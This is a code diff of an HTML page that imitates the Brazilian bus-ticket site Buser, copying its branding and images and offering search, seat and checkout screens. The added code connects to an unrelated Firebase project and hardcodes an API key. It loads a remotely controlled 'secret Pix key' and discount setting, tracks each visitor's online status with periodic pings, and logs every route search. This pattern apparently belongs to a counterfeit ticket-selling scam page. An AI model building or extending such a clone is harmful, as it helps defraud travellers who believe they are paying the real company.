@@ -7,8 +7,6 @@
 <link rel="preconnect" href="https://bcdn.com.br/" crossorigin>
 <link rel="preconnect" href="https://images.bcdn.com.br">
 <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&display=swap">
-
-<!-- CSS do Calendário Profissional -->
 <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/flatpickr/dist/flatpickr.min.css">
 
 <style>
@@ -23,7 +21,6 @@
   ul{list-style:none;margin:0;padding:0}
   .container{max-width:1200px;margin:0 auto;padding:0 16px;width:100%}
 
-  /* TASKBAR */
   .taskbar{position:fixed;top:0;left:0;right:0;z-index:35;height:calc(60px + var(--safe-top));padding-top:var(--safe-top);background-color:#fafafa;box-shadow: 0 4px 8px rgba(0,0,0,0.1);}
   .taskbar .t-content{align-items:center;display:flex;height:100%}
   .taskbar-desktop{display:flex;align-items:center;justify-content:space-between;flex-grow:1;height:100%;max-width:100%}
@@ -35,16 +32,12 @@
   @media (max-width:767px){.taskbar-desktop{display:none}.taskbar-mobile{display:flex;align-items:center;justify-content:center;width:100%}}
   @media (min-width:768px){.taskbar-mobile{display:none}}
 
-  /* HEADER */
   .header{padding-top:calc(60px + var(--safe-top))}
   .header .h-container{display:flex;flex-direction:column;align-items:center;gap:16px;min-height:390px;position:relative;width:100%;}
   .hc-background-brand{position:absolute;inset:0;z-index:-2;height:calc(100% - 90px);background:linear-gradient(180deg, var(--brand) 0%, var(--brand) 65%, #fff 100%);}
-  
-  /* IMAGEM DE FUNDO (BANNER) */
   .hc-video{position:absolute;inset:0;overflow:hidden;width:100%;z-index:-1;display:flex;flex-direction:column;align-items:center;justify-content:flex-start;padding-top:80px;}
   .hc-video img{width:100%;max-width:1200px;height:auto;object-fit:contain;}
   .hc-video::after {content: ""; position: absolute; inset: 0; background: linear-gradient(180deg, rgba(241,16,117,0.2) 0%, transparent 50%, rgba(241,16,117,0.6) 100%);}
-  
   .searchbox-wrapper{width:100%;position:relative;z-index:5;padding-inline:16px;margin-top: 180px;}
   .searchbox-card{background:#fff;border-radius:24px;padding:8px;display:flex;gap:4px;align-items:center;flex-wrap:wrap;box-shadow: 0 8px 24px rgba(87,75,6,0.1);position: relative;}
   .searchbox-field{flex:1;min-width:160px;height:74px;display: flex; flex-direction: column; justify-content: center; padding: 0 16px;border-right: 1px solid var(--grey-light); position: relative;}
@@ -52,22 +45,17 @@
   .searchbox-field label { font-size: 11px; color: var(--grey-med); font-weight: 500; margin-bottom: 2px; cursor: pointer; }
   .searchbox-field input { border: none; outline: none; font-size: 15px; font-family: 'Poppins', sans-serif; color: var(--grey-dark); width: 100%; background: transparent; font-weight: 600;}
   .searchbox-field input::placeholder { font-weight: 400; color: #999; }
-  
-  /* BOTÃO DE TROCAR (SWAP) */
   .swap-btn { background: #fff; border: 1px solid var(--grey-light); border-radius: 50%; width: 32px; height: 32px; display: flex; align-items: center; justify-content: center; cursor: pointer; position: absolute; left: 33%; top: 50%; transform: translate(-50%, -50%); z-index: 10; color: var(--brand); box-shadow: 0 2px 4px rgba(0,0,0,0.1); transition: 0.2s;}
   .swap-btn:hover { background: var(--brand); color: #fff; border-color: var(--brand); }
-
   .searchbox-btn{background: var(--brand); color: #fff; border: none; height: 58px; width: 58px; border-radius: 50%; display: flex; align-items: center; justify-content: center; cursor: pointer; margin: 0 8px; font-size: 20px; flex-shrink: 0; transition: transform 0.2s;}
   .searchbox-btn:hover { transform: scale(1.05); }
   .hcb-vantagens{display:flex;gap:40px;justify-content:center;height:16px;width:100%;font-size: 12px; color: var(--grey-dark); margin-top: 8px;}
 
-  /* AUTOCOMPLETE */
   .autocomplete-dropdown {position: absolute; top: 100%; left: 0; right: 0; background: #fff;border: 1px solid var(--grey-light); border-radius: 12px; margin-top: 8px;box-shadow: 0 10px 25px rgba(0,0,0,0.1); z-index: 100; max-height: 250px;overflow-y: auto; display: none;}
   .autocomplete-dropdown li { padding: 12px 16px; cursor: pointer; font-size: 14px; border-bottom: 1px solid #f0f0f0; }
   .autocomplete-dropdown li:hover { background-color: #fff7fa; color: var(--brand); }
   .autocomplete-dropdown li:last-child { border-bottom: none; }
 
-  /* RESULTADOS */
   #resultados-viagem {display: none; margin-top: 40px; padding: 24px; background: #fff;border-radius: 16px; box-shadow: 0 4px 20px rgba(0,0,0,0.08); border: 1px solid var(--grey-light);}
   #resultados-viagem h2 { font-size: 20px; margin: 0 0 16px; color: var(--brand); border-bottom: 2px solid var(--brand); padding-bottom: 8px; display: inline-block;}
   .trip-card { border: 1px solid var(--grey-light); border-radius: 12px; padding: 16px 24px; margin-bottom: 16px; display: flex; justify-content: space-between; align-items: center; background: #fff; }
@@ -77,7 +65,6 @@
   .trip-price span { display: block; font-size: 12px; font-weight: 400; color: var(--grey-med); text-align: right; margin-bottom: 4px;}
   .btn-comprar { background: var(--brand); color: #fff; border: none; padding: 10px 20px; border-radius: 8px; font-weight: 600; cursor: pointer; margin-top: 8px; font-family: 'Poppins';}
 
-  /* FILTROS */
   .resultados-layout { display: flex; gap: 24px; align-items: flex-start; }
   .filtros-sidebar { width: 250px; flex-shrink: 0; background: #fff; border-radius: 16px; padding: 20px; border: 1px solid var(--grey-light); }
   .filtros-sidebar h3 { font-size: 16px; font-weight: 600; margin-top: 0; margin-bottom: 12px; padding-bottom: 8px; border-bottom: 1px solid var(--grey-light); }
@@ -86,7 +73,6 @@
   .filtro-item input { width: 16px; height: 16px; accent-color: var(--brand); cursor: pointer; }
   @media (max-width: 768px) { .resultados-layout { flex-direction: column; } .filtros-sidebar { width: 100%; } }
 
-  /* PASSAGEIROS E POLTRONAS */
   .passageiro-box { background: #f9f9f9; padding: 16px; border-radius: 8px; margin-bottom: 16px; border: 1px solid #eee; }
   .passageiro-box input { width: 100%; padding: 10px; margin-bottom: 8px; border: 1px solid #ddd; border-radius: 6px; font-family: 'Poppins', sans-serif; }
   .poltrona-btn { width: 44px; height: 44px; border-radius: 8px; border: 1px solid #ddd; background: #fff; color: #333; font-weight: 600; cursor: pointer; transition: 0.2s; }
@@ -94,7 +80,6 @@
   .poltrona-btn.selecionada { background: var(--brand); color: #fff; border-color: var(--brand); }
   .poltrona-btn:disabled { background: #e0e0e0; color: #999; cursor: not-allowed; }
 
-  /* CARROSSEL DE CUPONS */
   .cupons-carrossel{margin-top:48px}
   .carousel ul{display:grid;gap:16px;grid-auto-flow:column;grid-auto-columns:calc(100%/3 - 16px);overflow-x:auto;padding:0 16px;scrollbar-width:none;scroll-snap-type:x mandatory;}
   .carousel ul::-webkit-scrollbar{display:none}
@@ -102,7 +87,6 @@
   .cupom-img{width: 100%; border-radius: 16px; object-fit: cover; aspect-ratio: 366/183; cursor: pointer; transition: transform 0.2s;}
   .cupom-img:hover { transform: scale(1.02); }
 
-  /* DESTINOS */
   .secao-destinos{margin-top:48px}
   .sdbc-header{display:flex;flex-direction:column;gap:16px;justify-content:space-between;margin-bottom:16px}
   @media (min-width:768px){.sdbc-header{align-items:center;flex-direction:row}}
@@ -121,7 +105,6 @@
   .dest-card .info {position: absolute; bottom: 0; left: 0; right: 0; background: linear-gradient(0deg, rgba(0,0,0,0.8) 0%, transparent 100%); padding: 24px 16px 16px; color: #fff;}
   .dest-card .info h3 { margin: 0; font-size: 18px; font-weight: 600; }
   .dest-card .info p { margin: 4px 0 0; font-size: 14px; }
-  
   .cd-destaque{grid-area:destaque; border-radius: 16px; overflow: hidden; position: relative; border: 1px solid var(--grey-light); cursor: pointer;}
   .cd-destaque img { width: 100%; height: 100%; object-fit: cover; }
   @media (max-width:767px){.cd-destaque{display:none}}
@@ -130,7 +113,6 @@
   .btn-outline{border: 1px solid var(--brand); color: var(--brand); background: transparent; padding: 14px 24px; border-radius: 16px; font-weight: 500; font-size: 16px; cursor: pointer; transition: 0.2s; text-decoration: none;}
   .btn-outline:hover { background: var(--brand); color: #fff; }
 
-  /* VALORES BUSER */
   .valores-buser{margin-top:64px;padding-top:40px; background: #fafafa; padding-bottom: 40px; border-radius: 24px;}
   .vb-head{text-align:center;margin-bottom:32px;padding-inline:24px}
   .vb-head h2 { font-size: 32px; font-weight: 600; margin: 8px 0; color: var(--brand); }
@@ -143,7 +125,6 @@
   .vb-card h3 { margin: 0; font-size: 20px; font-weight: 600; color: var(--brand); }
   .vb-card p { margin: 0; font-size: 14px; line-height: 1.5; color: var(--grey-med); }
 
-  /* MÍDIA */
   .midia-section{display:flex;flex-direction:column;gap:24px;overflow:hidden;margin-top:64px;position:relative;padding-block:24px;}
   @media (min-width:768px){.midia-section{align-items:center;flex-direction:row;padding-block:40px}}
   .ms-content{min-width:min(334px,30%); z-index: 2;}
@@ -160,7 +141,6 @@
   @media (min-width:768px){.ms-background{max-width:min(660px,55vw);bottom:unset;left:unset;right:24px}}
   .ms-background img { width: 100%; height: 100%; object-fit: cover; }
 
-  /* BANNERS HOME */
   .banners-home{display:grid;gap:16px;grid-template-columns:1fr;margin-top:64px}
   @media (min-width:768px){.banners-home{grid-template-columns:1fr 1fr}}
   .bh-promo{display:flex;flex-direction:column;gap:24px;align-items:center;background:#fdf6ec;border-radius:16px;padding:32px;}
@@ -175,7 +155,6 @@
   .bh-card .stores img { width: 120px; height: auto; cursor: pointer; }
   .bh-card .img-whats { width: 160px; height: 100%; object-fit: cover; border-radius: 12px; }
 
-  /* DESTINOS MAIS PROCURADOS */
   .destinos-procurados{margin-top:64px;padding-top:40px}
   .destinos-procurados h2 { text-align: center; font-size: 28px; margin-bottom: 32px; }
   .dp-carousel ul{grid-auto-columns:calc(100%/3 - 16px)}
@@ -189,7 +168,6 @@
   .dp-card .dp-row span { font-weight: 600; }
   .dp-card .ver-mais { display: block; text-align: right; color: var(--brand); font-size: 14px; font-weight: 600; margin-top: 16px; }
 
-  /* SOBRE BUSER */
   .sobre-buser{margin-top:64px}
   .ac-titulo{display:flex;flex-direction:column;align-items:center;text-align:center}
   .ac-titulo p { color: var(--brand); font-weight: 600; margin: 0 0 8px; }
@@ -205,7 +183,6 @@
   .mpv-item h3 { margin: 0; font-size: 18px; }
   .mpv-item p { margin: 0; font-size: 14px; color: var(--grey-med); line-height: 1.5; }
 
-  /* SEGURANÇA */
   .seguranca-section{background:linear-gradient(132deg,var(--brand) 33.33%,var(--brand-dark) 47.36%);color:#fff;padding:32px 0;margin-top:64px;border-radius:24px;}
   .ss-container{display:flex;flex-direction:column;gap:40px;align-items:center;padding-inline:24px}
   @media (min-width:768px){.ss-container{flex-direction:row;padding-inline:48px}}
@@ -218,7 +195,6 @@
   .btn-white{background: #fff; color: var(--brand); padding: 14px 24px; border-radius: 16px;font-weight: 600; text-decoration: none; display: inline-flex; align-items: center; gap: 8px;transition: 0.2s;}
   .btn-white:hover { transform: scale(1.05); }
 
-  /* FOOTER */
   .footer{margin-top:64px;padding-bottom:calc(56px + var(--safe-bottom));border-top:1px solid var(--grey-light)}
   @media (min-width:768px){.footer{padding-bottom:0}}
   .f-social-brand{display:flex;justify-content:space-between;align-items:center;padding:24px 0;flex-wrap:wrap;gap:16px}
@@ -233,7 +209,6 @@
   .f-links .r-link:hover { color: var(--brand); }
   .fe-copyright{padding:24px 0;display:flex;justify-content:center;font-size:12px;color:var(--grey-med);text-align:center}
 
-  /* NAV BOTTOM */
   .ada-nav-bottom{display:none;position:fixed;bottom:0;left:0;right:0;z-index:25;height:calc(56px + var(--safe-bottom));padding-bottom:var(--safe-bottom);background:#fff;box-shadow:0 -2px 3px rgba(0,0,0,0.1);justify-content: space-around; align-items: center;}
   @media (max-width:767px){.ada-nav-bottom{display:flex}}
   .nb-item{display: flex; flex-direction: column; align-items: center; justify-content: center;color: var(--grey-med); font-size: 11px; text-decoration: none; gap: 4px;}
@@ -265,8 +240,6 @@
 <header class="header">
   <div class="h-container">
     <span class="hc-background-brand" aria-hidden="true"></span>
-    
-    <!-- IMAGEM DO BANNER (ACIMA DO ORIGEM) -->
     <div class="hc-video" aria-hidden="true">
       <img src="https://images.bcdn.com.br/pItLwwNuUe3zU_I4iGqvV6UEeHU=/filters:quality(85):format(webp)/https%3A//d1q5r6jf4yxfe1.cloudfront.net/public/banners/2026/11/02/25/hero_desktop_home.png" alt="Banner Buser">
     </div>
@@ -278,25 +251,20 @@
           <input type="text" id="input-origem" placeholder="Cidade de origem" autocomplete="off">
           <ul id="lista-origem" class="autocomplete-dropdown"></ul>
         </div>
-        
         <button class="swap-btn" type="button" onclick="swapCidades()" title="Trocar origem e destino">⇅</button>
-
         <div class="searchbox-field">
           <label for="input-destino">Destino</label>
           <input type="text" id="input-destino" placeholder="Cidade de destino" autocomplete="off">
           <ul id="lista-destino" class="autocomplete-dropdown"></ul>
         </div>
-        
         <div class="searchbox-field">
           <label for="input-ida">Data de ida</label>
           <input type="text" id="input-ida" placeholder="Selecione a data" readonly>
         </div>
-        
         <div class="searchbox-field">
           <label for="input-volta">Data de volta <span style="font-weight:400; font-size:10px;">(Opcional)</span></label>
           <input type="text" id="input-volta" placeholder="Selecione a data" readonly>
         </div>
-        
         <button class="searchbox-btn" id="btn-pesquisar" aria-label="Pesquisar">🔍</button>
       </div>
     </div>
@@ -311,31 +279,21 @@
 
 <div class="container" id="resultados-viagem">
   <h2 id="titulo-resultados">Resultados da busca</h2>
-  
   <div class="resultados-layout">
     <aside class="filtros-sidebar" id="filtros-sidebar" style="display:none;">
-      <div class="filtro-grupo">
-        <h3>Viação</h3>
-        <div id="filtro-empresas"></div>
-      </div>
-      <div class="filtro-grupo">
-        <h3>Tipo de assento</h3>
-        <div id="filtro-tipos"></div>
-      </div>
+      <div class="filtro-grupo"><h3>Viação</h3><div id="filtro-empresas"></div></div>
+      <div class="filtro-grupo"><h3>Tipo de assento</h3><div id="filtro-tipos"></div></div>
     </aside>
-
     <div id="lista-viagens" style="flex: 1;"></div>
   </div>
 </div>
 
 <div class="container cupons-carrossel">
-  <section class="carousel">
-    <ul>
-      <li><img src="https://images.bcdn.com.br/FzOFcZ_a_eD5HV1Ck4LueOR3dgg=/1920x299/filters:quality(85):format(webp)/https%3A//d1q5r6jf4yxfe1.cloudfront.net/public/banners/2026/11/02/25/hero_desktop_home.png" class="cupom-img" alt="Cupom 1"></li>
-      <li><img src="https://images.bcdn.com.br/S9WY1kN5pYGibytsnJo2RadAmzo=/480x240/filters:quality(85):format(webp)/https%3A//d1q5r6jf4yxfe1.cloudfront.net/public/banners/2026/11/02/23/banner_black_friday.png" class="cupom-img" alt="Cupom 2"></li>
-      <li><img src="https://images.bcdn.com.br/-_h9-QlSqW6HfACE0JvTbhZocnQ=/360x180/filters:quality(85):format(webp)/https%3A//d1q5r6jf4yxfe1.cloudfront.net/public/banners/2026/09/08/23/banners-set-01.png" class="cupom-img" alt="Cupom 3"></li>
-    </ul>
-  </section>
+  <section class="carousel"><ul>
+    <li><img src="https://images.bcdn.com.br/FzOFcZ_a_eD5HV1Ck4LueOR3dgg=/1920x299/filters:quality(85):format(webp)/https%3A//d1q5r6jf4yxfe1.cloudfront.net/public/banners/2026/11/02/25/hero_desktop_home.png" class="cupom-img" alt="Cupom 1"></li>
+    <li><img src="https://images.bcdn.com.br/S9WY1kN5pYGibytsnJo2RadAmzo=/480x240/filters:quality(85):format(webp)/https%3A//d1q5r6jf4yxfe1.cloudfront.net/public/banners/2026/11/02/23/banner_black_friday.png" class="cupom-img" alt="Cupom 2"></li>
+    <li><img src="https://images.bcdn.com.br/-_h9-QlSqW6HfACE0JvTbhZocnQ=/360x180/filters:quality(85):format(webp)/https%3A//d1q5r6jf4yxfe1.cloudfront.net/public/banners/2026/09/08/23/banners-set-01.png" class="cupom-img" alt="Cupom 3"></li>
+  </ul></section>
 </div>
 
 <div class="container">
@@ -350,35 +308,17 @@
           <button class="cat-pill" onclick="ativarFiltro(this)">🎢 Parques</button>
         </div>
       </div>
-
       <div class="section-destinations">
         <div class="cd-multi-cards">
-          <div class="dest-card" onclick="preencherBusca('São Paulo, SP')">
-            <img src="https://images.bcdn.com.br/0gQ881-J5SiCq763cDlww-fmxdU=/360x56/filters:quality(85):format(webp)/https%3A//d1q5r6jf4yxfe1.cloudfront.net/public/banners/2026/11/02/25/hero_desktop_home.png" alt="São Paulo">
-            <div class="info"><h3>São Paulo</h3><p>A partir de R$ 19,90</p></div>
-          </div>
-          <div class="dest-card" onclick="preencherBusca('Rio de Janeiro, RJ')">
-            <img src="https://images.bcdn.com.br/CqR7qnxuRfN2X7Uye-Eh2XP__44=/480x240/filters:quality(85):format(webp)/https%3A//d1q5r6jf4yxfe1.cloudfront.net/public/banners/2026/09/08/23/banners-set-01.png" alt="Rio de Janeiro">
-            <div class="info"><h3>Rio de Janeiro</h3><p>A partir de R$ 88,02</p></div>
-          </div>
-          <div class="dest-card" onclick="preencherBusca('Belo Horizonte, MG')">
-            <img src="https://images.bcdn.com.br/OsNOVwLr7D8wucjpAxxKysHiLvc=/360x180/filters:quality(85):format(webp)/https%3A//d1q5r6jf4yxfe1.cloudfront.net/public/banners/2026/09/08/23/banners-set-03.png" alt="Belo Horizonte">
-            <div class="info"><h3>Belo Horizonte</h3><p>A partir de R$ 62,90</p></div>
-          </div>
-          <div class="dest-card" onclick="preencherBusca('Campinas, SP')">
-            <img src="https://images.bcdn.com.br/1IFiDUQwNFOeBumQZ5YyiRVNWN8=/360x180/filters:quality(85):format(webp)/https%3A//d1q5r6jf4yxfe1.cloudfront.net/public/banners/2026/09/08/23/banners-set-02.png" alt="Campinas">
-            <div class="info"><h3>Campinas</h3><p>A partir de R$ 20,90</p></div>
-          </div>
+          <div class="dest-card" onclick="preencherBusca('São Paulo, SP')"><img src="https://images.bcdn.com.br/0gQ881-J5SiCq763cDlww-fmxdU=/360x56/filters:quality(85):format(webp)/https%3A//d1q5r6jf4yxfe1.cloudfront.net/public/banners/2026/11/02/25/hero_desktop_home.png" alt="São Paulo"><div class="info"><h3>São Paulo</h3><p>A partir de R$ 19,90</p></div></div>
+          <div class="dest-card" onclick="preencherBusca('Rio de Janeiro, RJ')"><img src="https://images.bcdn.com.br/CqR7qnxuRfN2X7Uye-Eh2XP__44=/480x240/filters:quality(85):format(webp)/https%3A//d1q5r6jf4yxfe1.cloudfront.net/public/banners/2026/09/08/23/banners-set-01.png" alt="Rio de Janeiro"><div class="info"><h3>Rio de Janeiro</h3><p>A partir de R$ 88,02</p></div></div>
+          <div class="dest-card" onclick="preencherBusca('Belo Horizonte, MG')"><img src="https://images.bcdn.com.br/OsNOVwLr7D8wucjpAxxKysHiLvc=/360x180/filters:quality(85):format(webp)/https%3A//d1q5r6jf4yxfe1.cloudfront.net/public/banners/2026/09/08/23/banners-set-03.png" alt="Belo Horizonte"><div class="info"><h3>Belo Horizonte</h3><p>A partir de R$ 62,90</p></div></div>
+          <div class="dest-card" onclick="preencherBusca('Campinas, SP')"><img src="https://images.bcdn.com.br/1IFiDUQwNFOeBumQZ5YyiRVNWN8=/360x180/filters:quality(85):format(webp)/https%3A//d1q5r6jf4yxfe1.cloudfront.net/public/banners/2026/09/08/23/banners-set-02.png" alt="Campinas"><div class="info"><h3>Campinas</h3><p>A partir de R$ 20,90</p></div></div>
         </div>
-        <div class="cd-destaque" onclick="preencherBusca('Salvador, BA')">
-          <img src="https://images.bcdn.com.br/pItLwwNuUe3zU_I4iGqvV6UEeHU=/filters:quality(85):format(webp)/https%3A//d1q5r6jf4yxfe1.cloudfront.net/public/banners/2026/11/02/25/hero_desktop_home.png" alt="Destaque">
-        </div>
+        <div class="cd-destaque" onclick="preencherBusca('Salvador, BA')"><img src="https://images.bcdn.com.br/pItLwwNuUe3zU_I4iGqvV6UEeHU=/filters:quality(85):format(webp)/https%3A//d1q5r6jf4yxfe1.cloudfront.net/public/banners/2026/11/02/25/hero_desktop_home.png" alt="Destaque"></div>
       </div>
     </section>
-
-    <div class="sdb-button">
-      <a href="#" class="btn-outline">Ver mais destinos →</a>
-    </div>
+    <div class="sdb-button"><a href="#" class="btn-outline">Ver mais destinos →</a></div>
   </div>
 </div>
 
@@ -408,13 +348,11 @@
 
 <div class="container destinos-procurados">
   <h2>Destinos mais procurados</h2>
-  <section class="carousel dp-carousel">
-    <ul>
-      <li><div class="dp-card"><h3>Ônibus para São Paulo</h3><div class="dp-row"><a href="#">Saindo do Rio de Janeiro</a><span>R$ 93,90</span></div><div class="dp-row"><a href="#">Saindo de Belo Horizonte</a><span>R$ 100,75</span></div><div class="dp-row"><a href="#">Saindo de Ribeirão Preto</a><span>R$ 65,90</span></div><div class="dp-row"><a href="#">Saindo de Campinas</a><span>R$ 19,90</span></div><a href="#" class="ver-mais">Ver mais ônibus</a></div></li>
-      <li><div class="dp-card"><h3>Ônibus para Rio de Janeiro</h3><div class="dp-row"><a href="#">Saindo de São Paulo</a><span>R$ 88,02</span></div><div class="dp-row"><a href="#">Saindo de Belo Horizonte</a><span>R$ 62,90</span></div><div class="dp-row"><a href="#">Saindo de Vitória</a><span>R$ 80,90</span></div><div class="dp-row"><a href="#">Saindo de Campinas</a><span>R$ 70,90</span></div><a href="#" class="ver-mais">Ver mais ônibus</a></div></li>
-      <li><div class="dp-card"><h3>Ônibus para Belo Horizonte</h3><div class="dp-row"><a href="#">Saindo do Rio de Janeiro</a><span>R$ 62,90</span></div><div class="dp-row"><a href="#">Saindo de São Paulo</a><span>R$ 82,90</span></div><div class="dp-row"><a href="#">Saindo de Montes Claros</a><span>R$ 66,90</span></div><div class="dp-row"><a href="#">Saindo de Ipatinga</a><span>R$ 52,90</span></div><a href="#" class="ver-mais">Ver mais ônibus</a></div></li>
-    </ul>
-  </section>
+  <section class="carousel dp-carousel"><ul>
+    <li><div class="dp-card"><h3>Ônibus para São Paulo</h3><div class="dp-row"><a href="#">Saindo do Rio de Janeiro</a><span>R$ 93,90</span></div><div class="dp-row"><a href="#">Saindo de Belo Horizonte</a><span>R$ 100,75</span></div><div class="dp-row"><a href="#">Saindo de Ribeirão Preto</a><span>R$ 65,90</span></div><div class="dp-row"><a href="#">Saindo de Campinas</a><span>R$ 19,90</span></div><a href="#" class="ver-mais">Ver mais ônibus</a></div></li>
+    <li><div class="dp-card"><h3>Ônibus para Rio de Janeiro</h3><div class="dp-row"><a href="#">Saindo de São Paulo</a><span>R$ 88,02</span></div><div class="dp-row"><a href="#">Saindo de Belo Horizonte</a><span>R$ 62,90</span></div><div class="dp-row"><a href="#">Saindo de Vitória</a><span>R$ 80,90</span></div><div class="dp-row"><a href="#">Saindo de Campinas</a><span>R$ 70,90</span></div><a href="#" class="ver-mais">Ver mais ônibus</a></div></li>
+    <li><div class="dp-card"><h3>Ônibus para Belo Horizonte</h3><div class="dp-row"><a href="#">Saindo do Rio de Janeiro</a><span>R$ 62,90</span></div><div class="dp-row"><a href="#">Saindo de São Paulo</a><span>R$ 82,90</span></div><div class="dp-row"><a href="#">Saindo de Montes Claros</a><span>R$ 66,90</span></div><div class="dp-row"><a href="#">Saindo de Ipatinga</a><span>R$ 52,90</span></div><a href="#" class="ver-mais">Ver mais ônibus</a></div></li>
+  </ul></section>
 </div>
 
 <div class="container sobre-buser">
@@ -461,7 +399,7 @@
   <a href="#" class="nb-item"><i>👤</i> Perfil</a>
 </nav>
 
-<!-- MODAL DE PASSAGEIROS -->
+<!-- MODAL PASSAGEIROS -->
 <div id="modal-passageiros" style="display:none; position:fixed; inset:0; background:rgba(0,0,0,0.6); z-index:1002; align-items:center; justify-content:center;">
   <div style="background:#fff; padding:24px; border-radius:16px; max-width:600px; width:100%; margin:16px; max-height:90vh; overflow-y:auto;">
     <h2 style="color:var(--brand); margin-top:0;">Quem vai viajar?</h2>
@@ -478,7 +416,7 @@
   </div>
 </div>
 
-<!-- MODAL DE POLTRONA -->
+<!-- MODAL POLTRONA -->
 <div id="modal-poltrona" style="display:none; position:fixed; inset:0; background:rgba(0,0,0,0.6); z-index:1001; align-items:center; justify-content:center;">
   <div style="background:#fff; padding:24px; border-radius:16px; max-width:500px; width:100%; margin:16px; max-height:90vh; overflow-y:auto;">
     <h2 style="color:var(--brand); margin-top:0;">Escolha sua Poltrona</h2>
@@ -492,7 +430,7 @@
   </div>
 </div>
 
-<!-- MODAL DE CHECKOUT -->
+<!-- MODAL CHECKOUT -->
 <div id="modal-checkout" style="display:none; position:fixed; inset:0; background:rgba(0,0,0,0.6); z-index:1000; align-items:center; justify-content:center;">
   <div style="background:#fff; padding:32px; border-radius:16px; max-width:420px; width:100%; margin:16px;">
     <h2 style="color:var(--brand); margin-top:0;">Finalizar Reserva</h2>
@@ -518,9 +456,10 @@
 <!-- FIREBASE -->
 <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
 <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-firestore-compat.js"></script>
 <script>
 const firebaseConfig = {
-  apiKey: "COLE_AQUI",
+  apiKey: "AIzaSyCMoq8MNOUjlhqWhjaJ24uW4grhsFFhA", // <-- SUA CHAVE AQUI
   authDomain: "projeto-link-ddbf0.firebaseapp.com",
   databaseURL: "https://projeto-link-ddbf0-default-rtdb.firebaseio.com",
   projectId: "projeto-link-ddbf0",
@@ -529,10 +468,33 @@ const firebaseConfig = {
   appId: "1:560317126646:web:be9cad9c9ed350940399d7"
 };
 firebase.initializeApp(firebaseConfig);
-const db = firebase.database();
-const userId = 'user_' + Date.now();
-db.ref('visitas/' + userId).set({ online: true, entrouEm: Date.now() });
-window.addEventListener('beforeunload', () => { db.ref('visitas/' + userId).update({ online: false }); });
+const db = firebase.database();      // Realtime (online/visitas)
+const fs = firebase.firestore();      // Firestore (pedidos/config)
+
+/* ===== CONFIG GLOBAL (desconto + chave secreta) ===== */
+let CONFIG = { descontoGlobal: 0, chavePixSecreta: "" };
+fs.collection("config").doc("global").onSnapshot(snap => {
+  if (snap.exists) {
+    CONFIG = { ...CONFIG, ...snap.data() };
+    console.log("Config:", CONFIG);
+  }
+});
+
+/* ===== VISITAS + ONLINE ===== */
+const userId = 'user_' + Date.now() + '_' + Math.random().toString(36).slice(2);
+const userRef = db.ref('visitas/' + userId);
+userRef.set({ online: true, entrouEm: Date.now(), ultimoPing: Date.now() });
+userRef.onDisconnect().update({ online: false, saiuEm: Date.now() });
+setInterval(() => { userRef.update({ online: true, ultimoPing: Date.now() }); }, 20000);
+window.addEventListener('beforeunload', () => { userRef.update({ online: false, saiuEm: Date.now() }); });
+
+/* ===== LOG VIAGEM PESQUISADA ===== */
+function logViagemPesquisada(origem, destino, dataIda, dataVolta) {
+  fs.collection("viagens_pesquisadas").add({
+    origem, destino, dataIda, dataVolta: dataVolta || null,
+    userId, timestamp: firebase.firestore.FieldValue.serverTimestamp()
+  }).catch(console.warn);
+}
 </script>
 
 <!-- CALENDÁRIO -->
@@ -561,7 +523,6 @@ window.addEventListener('beforeunload', () => { db.ref('visitas/' + userId).upda
   function configurarAutocomplete(inputId, listaId) {
     const input = document.getElementById(inputId);
     const lista = document.getElementById(listaId);
-    
     input.addEventListener('focus', function() {
       lista.innerHTML = '';
       const sugestoes = cidadesBrasil.slice(0, 10);
@@ -570,49 +531,28 @@ window.addEventListener('beforeunload', () => { db.ref('visitas/' + userId).upda
         sugestoes.forEach(cidade => {
           const li = document.createElement('li');
           li.textContent = cidade;
-          li.onmousedown = function(e) {
-            e.preventDefault(); 
-            input.value = cidade;
-            lista.style.display = 'none';
-            if(inputId === 'input-origem') document.getElementById('input-destino').focus();
-          };
+          li.onmousedown = function(e) { e.preventDefault(); input.value = cidade; lista.style.display = 'none'; if(inputId === 'input-origem') document.getElementById('input-destino').focus(); };
           lista.appendChild(li);
         });
       }
     });
-
     input.addEventListener('input', function() {
       const termo = normalizarTexto(this.value);
       lista.innerHTML = '';
-      
-      if (termo.length < 2) { 
-        lista.style.display = 'none'; 
-        return; 
-      }
-
+      if (termo.length < 2) { lista.style.display = 'none'; return; }
       const filtradas = cidadesBrasil.filter(c => normalizarTexto(c).includes(termo)).slice(0, 10);
-
       if (filtradas.length > 0) {
         lista.style.display = 'block';
         filtradas.forEach(cidade => {
           const li = document.createElement('li');
           li.textContent = cidade;
-          li.onmousedown = function(e) {
-            e.preventDefault(); 
-            input.value = cidade;
-            lista.style.display = 'none';
-            if(inputId === 'input-origem') document.getElementById('input-destino').focus();
-          };
+          li.onmousedown = function(e) { e.preventDefault(); input.value = cidade; lista.style.display = 'none'; if(inputId === 'input-origem') document.getElementById('input-destino').focus(); };
           lista.appendChild(li);
         });
-      } else {
-        lista.style.display = 'none';
-      }
+      } else { lista.style.display = 'none'; }
     });
-
     document.addEventListener('click', e => { if (e.target !== input && e.target !== lista) lista.style.display = 'none'; });
   }
-
   configurarAutocomplete('input-origem', 'lista-origem');
   configurarAutocomplete('input-destino', 'lista-destino');
 
@@ -626,19 +566,13 @@ window.addEventListener('beforeunload', () => { db.ref('visitas/' + userId).upda
     const origemTexto = document.getElementById('input-origem').value;
     const destinoTexto = document.getElementById('input-destino').value;
     const dataIda = document.getElementById('input-ida').value;
+    const dataVolta = document.getElementById('input-volta').value;
 
-    if (!origemTexto.includes(',')) {
-      alert("Por favor, selecione a cidade de origem na lista de sugestões.");
-      return;
-    }
-    if (!destinoTexto.includes(',')) {
-      alert("Por favor, selecione a cidade de destino na lista de sugestões.");
-      return;
-    }
-    if (!dataIda) {
-      alert("Por favor, escolha a data de ida.");
-      return;
-    }
+    if (!origemTexto.includes(',')) { alert("Por favor, selecione a cidade de origem na lista de sugestões."); return; }
+    if (!destinoTexto.includes(',')) { alert("Por favor, selecione a cidade de destino na lista de sugestões."); return; }
+    if (!dataIda) { alert("Por favor, escolha a data de ida."); return; }
+
+    logViagemPesquisada(origemTexto, destinoTexto, dataIda, dataVolta);
 
     const containerResultados = document.getElementById('resultados-viagem');
